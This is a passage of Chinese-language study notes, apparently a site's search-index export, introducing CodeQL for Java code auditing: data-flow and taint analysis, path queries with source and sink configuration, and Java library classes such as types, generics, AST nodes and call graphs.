\u4e3a\u4e86\u89e3\u51b3\u4e0a\u9762\u7684\u96be\u9898\uff0c\u73b0\u5728\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u5efa\u6a21\u624b\u6bb5\u53ef\u4f9b\u6211\u4eec\u9009\u62e9 \u5c40\u90e8\u6570\u636e\u6d41\uff1a\u6570\u636e\u6d41\u56fe\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8fb9\uff0c\u53ea\u8003\u8651\u5728\u540c\u4e00\u4e2a\u65b9\u6cd5\u5185\u3002\u4e5f\u5c31\u662f\u53ea\u8003\u8651\u53d8\u91cf\u5728\u4e00\u4e2a\u65b9\u6cd5\u5185\u7684\u6570\u636e\u6d41\u5411\uff0c\u5ffd\u7565\u5728\u4e0d\u540c\u65b9\u6cd5\u4e4b\u95f4\u548c\u5bf9\u8c61\u5c5e\u6027\u4e2d\u7684\u6570\u636e\u6d41\u5411\u3002\u5b83\u7684\u901f\u5ea6\u5f88\u5feb\u800c\u4e14\u5f88\u7cbe\u786e\uff0c\u800c\u4e14\u66f4\u7b80\u5355\uff0c\u5bf9\u4e8e\u5f88\u591a\u95ee\u9898\u5b83\u5df2\u7ecf\u8db3\u591f\u7528\u4e86\u3002 \u5168\u5c40\u6570\u636e\u6d41\uff1a\u672c\u5730\u6570\u636e\u6d41\u8003\u8651\u548c\u4e0d\u8003\u8651\u7684\u6570\u636e\u6d41\u5411\uff0c\u5b83\u90fd\u8003\u8651\u4e86\u3002\u4e5f\u5c31\u662f\u8bf4\u5b83\u4f1a\u5bf9\u6574\u4e2a\u9879\u76ee\u8fdb\u884c\u5efa\u6a21\uff0c\u5b83\u66f4\u8d39\u65f6\u4f46\u662f\u66f4\u52a0\u5168\u9762 ** \u6570\u636e\u6d41\u548c\u6c61\u70b9\u8ffd\u8e2a ** \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8ffd\u8e2a\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 X\u3002 \u968f\u7740\u7a0b\u5e8f\u7684\u8fdb\u884c\uff0cX\u6765\u5230\u4e86\u8fd9\u6837\u7684\u4ee3\u7801\u4e2d\uff1a y=X+1\u3002 \u7531\u4e8ey\u662f\u7531X\u6d3e\u751f\u7684\uff0c\u5b83\u88abX\u611f\u67d3\u5f71\u54cd\u4e86\uff0c\u6240\u4ee5\u5b83\u4e5f\u5df2\u7ecf\u6210\u4e3a\u4e86\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u5bf9\u8c61 \u4f20\u7edf\u7684\u6570\u636e\u6d41\u5206\u6790\u4f1a\u7740\u91cd\u4e8eX\u672c\u8eab\uff0c\u800c\u4e0d\u4f1a\u6ce8\u610f\u5230y\uff0c\u5b83\u53ef\u80fd\u4f1a\u53ea\u6ce8\u610fX\u6709\u53ef\u80fd\u6210\u4e3a\u54ea\u4e9b\u503c\u3002 \u800c\u6c61\u70b9\u8ddf\u8e2a\u5219\u4f1a\u5206\u6790y\uff0c\u56e0\u4e3ay\u4e5f\u88ab\u6c61\u70b9\u6240\u6c61\u67d3\u4e86\uff0c\u5206\u6790\u6c61\u70b9\u4ecex\u6d41\u5411y\u7684\u8fc7\u7a0b\u4fbf\u662f\u6c61\u70b9\u8ffd\u8e2a","title":"\u6570\u636e\u6d41\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#path-queries","text":"\u5728\u4e0a\u9762\u7684\u5c0f\u8282\u4e2d\u7b80\u5355\u53d9\u8ff0\u4e86\u5173\u4e8e Path queries \u548c Alert queries path queries\u5728\u6f0f\u6d1e\u6316\u6398\u4e2d\u662f\u5f88\u6709\u7528\u7684\u3002\u8bb8\u591a\u5b89\u5168\u95ee\u9898\u662f\u56e0\u4e3a\u6570\u636e\u4ece\u5f00\u59cb\u7aef\u70b9\u6d41\u5165\u7a0b\u5e8f\uff08source\uff09\uff0c\u76f4\u5230\u6d41\u5165\u6700\u540e\u4f1a\u9020\u6210\u5b89\u5168\u98ce\u9669\u7684\u7aef\u70b9\uff08sink\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u5728codeql\u4e2d\u63d0\u4f9bsource\u548csink\u7684\u4fe1\u606f\u6765\u67e5\u627e\u4ecesource\u5230sink\u7684\u8def\u5f84\u3002 path queries \u6a21\u677f\u5982\u4e0b /** * ... * @kind path-problem //path queries\u9700\u8981\u6709\u8fd9\u4e2ametadata * ... */ import <language> // For some languages (Java/C++/Python) you need to explicitly import the data flow library, such as // import semmle.code.java.dataflow.DataFlow import DataFlow::PathGraph ... from MyConfiguration config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select sink.getNode(), source, sink, \"<message>\" \u5176\u4e2d\uff0cDataFlow::PathGraph \u662f\u5f15\u5165\u7684\u4e00\u4e2a\u6a21\u5757 DataFlow::PathNode source, DataFlow::PathNode sink \u5206\u522b\u662fPathGraph\u4e2d\u7684\u8fde\u4e2a\u8282\u70b9 MyConfiguration \u662f\u6211\u4eec\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u4e00\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u5b9e\u73b0\u4e86source\u548csink\u7684\u5b9a\u4e49\u3002","title":"Path queries"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_7","text":"\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5f15\u5165\u4e86 DataFlow::PathGraph\uff0c\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u8fd9\u5c31\u9700\u8981\u8bb2\u5230\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8def\u5f84\u662f\u5982\u4f55\u751f\u6210\u7684\u4e86\u3002 \u5982\u679c\u6211\u4eec\u4e0d\u7528DataFlow::PathGraph\u8fd9\u79cd\u989d\u5916\u7684\u6a21\u5757\uff0c\u60f3\u8981\u83b7\u53d6\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8def\u5f84\uff0c\u5c31\u9700\u8981\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u4e00\u4e2a\u540d\u4e3a query predicate \u7684\u8c13\u8bcd\uff0c\u5b83\u957f\u8fd9\u6837 query predicate edges(PathNode a, PathNode b) { /** Logical conditions which hold if `(a,b)` is an edge in the data flow graph */ } \u5b83\u4f1a\u6839\u636e\u8c13\u8bcd\u91cc\u7ed9\u5b9a\u7684\u903b\u8f91\u518d\u7ed3\u5408\u6570\u636e\u6d41\u56fe\uff0c\u751f\u6210\u8282\u70b9\u4e0e\u8282\u70b9\u4e4b\u95f4\u7684\u8fb9\u3002 \u4f46\u8fd9\u6837\u592a\u9ebb\u70e6\u4e86\uff0c\u6240\u4ee5\u5c31\u5f15\u5165\u4e86DataFlow::PathGraph\u8fd9\u79cd\u6a21\u5757\uff0c\u8fd9\u79cd\u6a21\u5757\u5185\u90e8\u5b9a\u4e49\u4e86edges\u8c13\u8bcd\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u62ff\u6765\u7528\u3002","title":"\u5f15\u5165\u6a21\u5757"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#sourcesink","text":"\u5728\u4e00\u4e2apath query\u91cc\uff0c\u6307\u5b9asource\u548csink\u662f\u5fc5\u987b\u7684\u3002 \u8981\u6307\u5b9asource\u548csink\uff0c\u9700\u8981\u5b9a\u4e00\u4e2a\u7ee7\u627f\u81eaTaintTracking::Configuration\u7684\u7c7b\uff0c\u5e76\u4e14\u91cd\u5199isSource\u3001isSink\u65b9\u6cd5 class VulConfig extends TaintTracking::Configuration { VulConfig() { this = \"SqlInjectionConfig\" } override predicate isSource(DataFlow::Node src) { /*\u6307\u5b9asource node */ } override predicate isSink(DataFlow::Node sink) { /*\u6307\u5b9asink node */ } }","title":"\u6307\u5b9asource\u3001sink"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#_8","text":"\u6700\u540e\u6211\u4eec\u4f1a\u7528from ...where...select... \u6765\u6307\u5b9a \u4ecesource\u6d41\u5411sink\u7684\u8282\u70b9\u8def\u5f84 from Configuration config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select element, source, sink, string from \u9009\u62e9\u4e86\u4e09\u4e2a\u4e1c\u897f\uff1a\u4e00\u4e2aConfiguration\u53d8\u91cf\uff08Configuration\u7c7b\u5373\u6211\u4eec\u5b9a\u4e49source\u3001sink\u65f6\u521b\u5efa\u7684\u7c7b\uff09\uff0c\u4ee5\u53ca\u4e24\u4e2aPathNode\u5206\u522b\u4ee3\u8868source\u548csink\u8282\u70b9 \u7136\u540e\u4f7f\u7528where\u5b50\u53e5\u8c03\u7528config.hasFlowPath \u6765\u9650\u5236source\u5230sink\u7684\u6d41\u662f\u7b26\u5408\u6211\u4eec\u5b9a\u4e49\u7684Configuration\u7c7b\u4e2d\u6240\u89c4\u8303\u7684 \u7136\u540e\u4f7f\u7528select\u5b50\u53e5\u9009\u62e9\u7b26\u5408\u4eec\u5b9a\u4e49\u7684Configuration\u7c7b\u4e2d\u6240\u89c4\u8303\u7684source\u8282\u70b9\u548csink\u8282\u70b9\uff0c\u6211\u4eec\u9664\u6b64\u4e4b\u5916\u8fd8\u53ef\u4ee5\u9009\u62e9\u5143\u7d20\u548c\u5b57\u7b26\u4e32\u7b49\u6570\u636e\u3002","title":"\u9009\u62e9\u8282\u70b9"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#codeql-java","text":"","title":"Codeql-java"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#java","text":"\u56e0\u4e3a\u6211\u5b66codeql\u7684\u4e3b\u8981\u76ee\u7684\u662f\u6316\u6398java\u6f0f\u6d1e\uff0c\u6240\u4ee5\u6211\u4f1a\u66f4\u5173\u5fc3codeql\u5728java\u4e2d\u7684\u5e94\u7528\u3002 codeql\u4e2d\u7684java\u6838\u5fc3\u4f9d\u8d56\u7c7b\u5e93\u662fjava.qll\uff0c\u6211\u4eec\u4f7f\u7528\u65f6\u76f4\u63a5import java\u5373\u53ef\u3002 \u5b83\u4e3b\u8981\u6709\u4e94\u79cd\u7c7b\u578b\u7684\u7c7b 1.Element\u4ee3\u8868\u9879\u76ee\u4e2d\u7684\u5143\u7d20\uff08\u7c7b\u3001\u65b9\u6cd5\u7b49\uff09 2.ASTNode\u4ee3\u8868AST\u8282\u70b9\uff08statements\u548c\u8868\u8fbe\u5f0f\u7b49\uff09 3.metadata\u4ee3\u8868\u5143\u6570\u636e\uff08\u6ce8\u91ca\u7b49\uff09 4.metrics\u8ba1\u7b97\u6307\u6807\uff0c\u4f8b\u5982\u5faa\u73af\u590d\u6742\u5ea6 5.Call Gragh\u4ee3\u8868\u9879\u76ee\u7684\u8c03\u7528\u56fe\uff0c\u6216\u8005\u8bf4\u8c03\u7528\u5173\u7cfb","title":"java\u5e93"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#element","text":"java\u5e93\u4e2d\u5bf9Element\u7c7b\u7684\u7ee7\u627f\u5173\u7cfb\u5982\u4e0b \u6709\u4e00\u4e9b\u5b98\u65b9\u6587\u6863\u63d0\u5230\u7684\u6982\u5ff5\uff0c\u5728\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b","title":"\u5143\u7d20Element"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#type","text":"PrimitiveType \u4e3b\u6570\u636e\u7c7b\u578b\uff1a boolean, byte, char, double, float, int, long, short, void, \\ , null RefType \u5f15\u7528\u7c7b\u578b\uff1a Class\u3001Interface\u3001EnumType\u3001Array TopLevelType :\u5b9a\u4e49\u5728\u4e00\u4e2ajava\u5305\u4e2d\u6700\u9ad8\u5c42\u7684Type\uff08\u5305\u62ecclass\u3001interface\u7b49\uff09 NestedType :\u9664 TopLevelType \u4ee5\u5916\u7684Type\uff0c\u5982\u533f\u540dclass\u7b49 TopLevelClass \u5b9a\u4e49\u5728\u4e00\u4e2ajava\u5305\u4e2d\u6700\u9ad8\u5c42\u7684class\uff0c\u662f TopLevelType \u7684\u5b50\u7c7b NestedClass \u9664 NestedClass \u4ee5\u5916\u7684class\uff0c\u5982\u533f\u540dclass\uff0c\u4e00\u4e2a\u7c7b\u7684\u5185\u90e8\u5b9a\u4e49\u7684class\u7b49\uff0c\u662f NestedType \u5b50\u7c7b \u4e0b\u9762\u662f\u5173\u4e8e\u4ee5\u4e0a\u6982\u5ff5\u7684\u4e00\u4e9bcodeql\u67e5\u8be2\u8bed\u53e5 TopLevelType import java from TopLevelType tl where tl.getName() != tl.getCompilationUnit().getName() select tl \u6211\u8ba4\u4e3a\u8fd9\u6bb5ql\u4ee3\u7801\u662f\u53bb\u67e5\u8be2\u6240\u6709\u5305\u540d\u548cType\u540d\u4e0d\u4e00\u81f4\u7684TopLevelType \u5982\u4f1a\u67e5\u8be2\u51fa\u8fd9\u79cdclass\uff1aNioQueueSubscriptionTestListener package org.apache.activemq.broker; /*code*/ class NioQueueSubscriptionTestListener implements ExceptionListener { /*code*/ \u6216\u8005\u8fd9\u6837\u7684interface package org.apache.activemq.bugs; /*code*/ interface Configurer { public void configure(BrokerService broker) throws Exception; } import java from NestedClass nc where nc.getASupertype() instanceof TypeObject select nc \u6211\u8ba4\u4e3a\u8fd9\u6bb5ql\u4ee3\u7801\u53bb\u67e5\u8be2\u6240\u6709\u76f4\u63a5\u7ee7\u627f\u81eaObject\u7684NestedClass \u3002 \u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u6ca1\u6709extends\u8bed\u53e5\u7684\u7c7b\uff08\u4f46\u8fd8\u662f\u4f1a\u67e5\u8be2\u5230implements \u8bed\u53e5\uff09 \u8fd9\u4e0d\u7981\u8ba9\u6211\u601d\u8003extends\u548cimplements \u7684\u533a\u522b\uff1a \u3000Extends\u53ef\u4ee5\u7406\u89e3\u4e3a\u5168\u76d8\u7ee7\u627f\u4e86\u7236\u7c7b\u7684\u529f\u80fd\u3002implements\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e3a\u8fd9\u4e2a\u7c7b\u9644\u52a0\u4e00\u4e9b\u989d\u5916\u7684\u529f\u80fd\uff1b \u3000interface\u5b9a\u4e49\u4e00\u4e9b\u65b9\u6cd5,\u5e76\u6ca1\u6709\u5b9e\u73b0,\u9700\u8981implements\u6765\u5b9e\u73b0\u624d\u53ef\u7528\u3002 \u3000extend\u53ef\u4ee5\u7ee7\u627f\u4e00\u4e2a\u63a5\u53e3,\u4f46\u4ecd\u662f\u4e00\u4e2a\u63a5\u53e3,\u4e5f\u9700\u8981implements\u4e4b\u540e\u624d\u53ef\u7528\u3002 \u3000\u5bf9\u4e8eclass\u800c\u8a00\uff0cExtends\u7528\u4e8e(\u5355)\u7ee7\u627f\u4e00\u4e2a\u7c7b\uff08class\uff09\uff0c\u800cimplements\u7528\u4e8e\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3(interface)\u3002 \u3000\u2014\u2014\u2014\u2014https://cloud.tencent.com/developer/article/1074987\u300a\u6d45\u8c08java\u4e2dextends\u4e0eimplements\u7684\u533a\u522b\u300b","title":"Type\uff08\u7c7b\u578b\uff09&#xA;&#xA;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#generics","text":"codeql\u4e2d\u6cdb\u578b\u7528 GenericType \u8868\u793a\uff0c\u5b83\u6709\u5b50\u7c7b GenericInterface \u548c GenericClass \u5206\u522b\u8868\u793a\u6240\u6709\u6cdb\u578b\u63a5\u53e3\u548c\u6cdb\u578b\u7c7b\u3002 \u5f53\u6cdb\u578b\u7c7b\u5df2\u7ecf\u4f20\u5165\u7279\u5b9a\u7c7b\u578b\u7684\u53d8\u91cf\u8fdb\u884c\u53c2\u6570\u5316\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 ParameterizedType \u6765\u8868\u793a\u6240\u6709\u53c2\u6570\u5316\u540e\u7684\u6cdb\u578b\u793a\u4f8b\uff0c\u6bd4\u5982List\\ \u6216\u8005List\\ \u5c31\u662f\u53c2\u6570\u5316\u540e\u7684\u6cdb\u578b\u3002\u5bf9\u4e8e ParameterizedType \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u5176\u5185\u90e8\u65b9\u6cd5 getSourceDeclaration \u6765\u83b7\u5f97\u5b83\u5bf9\u5e94\u7684 GenericType \u3002 TypeVariable \u4ee3\u8868\u6cdb\u578b<>\u4e2d\u7684\u53d8\u91cf\uff0cTypeBound \u4ee3\u8868\u8fd9\u4e9b\u53d8\u91cf\u7684\u8303\u56f4\uff0c\u5982 \\ \u90a3\u4e48N\u7684Bound\u5c31\u662fNumber\u3002TypeBound\u6211\u4eec\u53ef\u4ee5\u7528getType\u65b9\u6cd5\u6765\u83b7\u53d6\u8fd9\u4e2a\u8303\u56f4\u3002 \u6bcf\u4e00\u4e2a\u6cdb\u578b\u90fd\u6709\u4e00\u4e2a\u65e0\u53c2\u7248\uff0c\u6211\u4eec\u7528RawType\u8868\u793a\uff0c\u6bd4\u5982List\\ \u7684RawType\u5c31\u662fList<>\uff0cRawType\u6709\u4e24\u4e2a\u5b50\u7c7bRawClass\u548cRawInterface\u3002\u6211\u4eec\u53ef\u4ee5\u7528 getSourceDeclaration\u83b7\u53d6GenericType","title":"Generics\uff08\u6cdb\u578b\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#variables","text":"\u7528 Variable \u8868\u793a\u3002\u5176\u6709\u4e09\u4e2a\u5b50\u7c7b\u5206\u522b\u4e3a Field \u7c7b\u91cc\u9762\u7684\u6210\u5458\u53d8\u91cf LocalVariableDecl \u672c\u5730\u53d8\u91cf Parameter \u65b9\u6cd5\u7684\u53c2\u6570","title":"Variables\uff08\u53d8\u91cf\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#ast","text":"codeql java\u5e93\u4e2d\u628aAST\u8282\u70b9\u5206\u4e3a\u4e86statements\uff08Stmt\uff09\u548cexpressions (Expr\uff09\u3002\u524d\u8005\u4ee3\u8868\u7740\u8bed\u53e5\u7ed3\u6784\uff0c\u540e\u8005\u4ee3\u8868\u7740\u5177\u4f53\u7684\u503c\u3002 \u8fd9\u662f\u8be6\u7ec6\u4ecb\u7ecd Abstract syntax tree classes for working with Java programs Expr.getAChildExpr \u8fd4\u56de\u7ed9\u5b9a\u8868\u8fbe\u5f0f\u7684\u5b50\u8868\u8fbe\u5f0f Stmt.getAChild \u8fd4\u56de\u7ed9\u5b9a\u8bed\u53e5\u5757\u7684\u5b50\u8868\u8fbe\u5f0f\u6216\u5b50\u8bed\u53e5\u5757 Expr.getParent and Stmt.getParent \u8fd4\u56de\u7236\u8282\u70b9\uff0c\u8868\u8fbe\u5f0f\u7684\u7236\u8282\u70b9\u4e0d\u4e00\u5b9a\u662f\u8868\u8fbe\u5f0f\uff0c\u8bed\u53e5\u5757\u7684\u7236\u8282\u70b9\u4e5f\u4e0d\u4e00\u5b9a\u662f\u8bed\u53e5\u5757\u3002 \u5b98\u65b9\u6587\u6863\u793a\u4f8b import java from Expr e where e.getParent() instanceof ReturnStmt select e \u83b7\u53d6\u6240\u6709\u7236\u8282\u70b9\u662fReturnStmt\u7684\u8868\u8fbe\u5f0f","title":"\u62bd\u8c61\u8bed\u6cd5\u6811 ast"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#metadata_1","text":"\u4e00\u822c\u5305\u62ec\u4ee3\u7801\u4e2d\u7684\u6ce8\u89e3\uff08 annotations \uff0c\u5982@overriede\uff09\u548cJavadoc\u6ce8\u89e3\u3002 Annotatable \u662fannotations\u5728codeql\u4e2d\u7684\u9876\u7ea7\u7c7b\u3002\u5305\u62ec\u5305\u3001\u5f15\u7528\u7c7b\u578b\u3001\u5b57\u6bb5\u3001\u65b9\u6cd5\u3001\u6784\u9020\u5668\u548c\u5c40\u90e8\u53d8\u91cf\u58f0\u660e\uff0c\u53ef\u4ee5\u901a\u8fc7\u7a0b\u5e8f\u5143\u7d20\u7684\u8c13\u8bcd getAnAnnotation \u6765\u83b7\u53d6\u3002 \u5bf9\u4e8e\u50cf@xxx \u8fd9\u79cd\u6ce8\u91ca\uff0c\u5b83\u4eec\u90fd\u88ab\u5305\u542b\u5728 Annotation \u8fd9\u4e2a\u7c7b\u4e2d\uff0c getAnAnnotation \u83b7\u53d6\u5230\u7684\u4fbf\u662f Annotation \u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Annotation \u7684gettype\u65b9\u6cd5\u83b7\u53d6\u8fd9\u4e2a\u6ce8\u91ca\u7684\u7c7b\u578b\u3002","title":"\u5143\u6570\u636e metadata"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#metrics","text":"\u53ef\u4ee5\u7528\u6765\u67e5\u8be2\"\u5faa\u73af\u590d\u6742\u5ea6\u5927\u4e8e40\u7684\u65b9\u6cd5\"\u7b49\u7c7b\u4f3c\u7684\u4e1c\u897f","title":"\u6307\u6807Metrics"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#call-gragh","text":"\u6bcf\u5f53\u4e00\u6b21\u6784\u9020\u65b9\u6cd5\u6216\u8005\u65b9\u6cd5\u88ab\u8c03\u7528\u65f6\uff0c\u5c31\u4f1a\u4ea7\u751f\u4e00\u6b21\u65b9\u6cd5\u8c03\u7528\uff08\u7528\u7c7b Call\u8868\u793a\uff09 \u6211\u4eec\u53ef\u4ee5\u7528Call.getCallee\u6765\u83b7\u53d6\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\u540d \u540c\u65f6\u8fd8\u6709\u4e00\u4e2a\u7c7bCallable\u8868\u793a\u6240\u6709\u53ef\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\uff0c Callable.getAReference \u53ef\u4ee5\u83b7\u53d6\u5b83\u5728\u54ea\u91cc\u88ab\u8c03\u7528\u4e86\uff0c\u8fd4\u56de\u4e00\u4e2aCall\u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u7528\u4e0b\u9762\u7684query\u83b7\u53d6\u672a\u88ab\u8c03\u7528\u8fc7\u7684\u65b9\u6cd5\u3002 import java from Callable c where not exists(c.getAReference()) select c \u5173\u4e8eCall\u548cCallable\uff0c\u5b98\u65b9\u7ed9\u4e86\u4e2a\u4f8b\u5b50\u7528\u4e8e\u5206\u8fa8 class Super { int x; // callable public Super() { this(23); // call } // callable public Super(int x) { this.x = x; } // callable public int getX() { return x; } } class Sub extends Super { // callable public Sub(int x) { super(x+19); // call } // callable public int getX() { return x-19; } } class Client { // callable public static void main(String[] args) { Super s = new Sub(42); // call s.getX(); // call } } Call\u6709\u4e24\u4e2a\u91cd\u8981\u8c13\u8bcd getCallee\u548cgetCaller\u3002 \u4e2a\u4eba\u8ba4\u4e3agetCallee\u662f\u83b7\u53d6\u65b9\u6cd5\u8c03\u7528\u4e2d\u6240\u8c03\u7528\u7684\u65b9\u6cd5\uff0cgetCaller\u662f\u83b7\u53d6\u662f\u5728\u54ea\u4e2a\u65b9\u6cd5\u5185\u90e8\u4ea7\u751f\u7684\u65b9\u6cd5\u8c03\u7528 Callable\u6709\u4e2a\u91cd\u8981\u8c13\u8bcd\uff1apolyCalls(Callable target)\uff0c\u5982\u679c\u53c2\u6570\u4e2d\u7684target\u6216\u5176\u91cd\u5199\u65b9\u6cd5\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u88ab\u8c03\u7528\u4e86\uff0c\u90a3\u4e48\u5c31\u4f1a\u8fd4\u56de\u6210\u529f\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u6b64\u6765\u68c0\u6d4b\u7a0b\u5e8f\u4e2d\u672a\u7ecf\u8c03\u7528\u8fc7\u7684\u65b9\u6cd5\u3002 import java from Callable callee where not exists(Callable caller | caller.polyCalls(callee)) select callee","title":"\u8c03\u7528\u5173\u7cfbCall Gragh"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#java_1","text":"","title":"java\u6570\u636e\u6d41\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%A1%E8%AE%A1/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/Codeql%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/#local-data-flow","text":"\u5c40\u90e8\u6570\u636e\u6d41\u662f\u6307\u4e00\u4e2a\u65b9\u6cd5\u6216\u8005\u4e00\u4e2a\u8c03\u7528\u5185\u7684\u6570\u636e\u6d41\uff0c\u5b83\u5728\u5904\u7406\u8bb8\u591a\u67e5\u8be2\u65f6\u6bd4\u5168\u5c40\u6570\u636e\u6d41\u66f4\u7b80\u5355\u3001\u5feb\u901f\u548c\u7cbe\u786e\u3002 \u5c40\u90e8\u6570\u636e\u6d41\u7684\u76f8\u5173\u5e93\u4f4d\u4e8eDataFlow\u6a21\u5757\uff0c\u9700\u8981\u5bfc\u5165 import semmle.code.java.dataflow.DataFlow \u6570\u636e\u6d41\u8282\u70b9\u6307\u6570\u636e\u80fd\u6d41\u7ecf\u7684\u6240\u6709\u8282\u70b9\uff0c\u6570\u636e\u6d41\u8282\u70b9\u5206\u4e3a\u8868\u8fbe\u5f0f\u8282\u70b9\uff08ExprNode\uff09\u548c\u53c2\u6570\u8282\u70b9\uff08ParamterNode\uff09 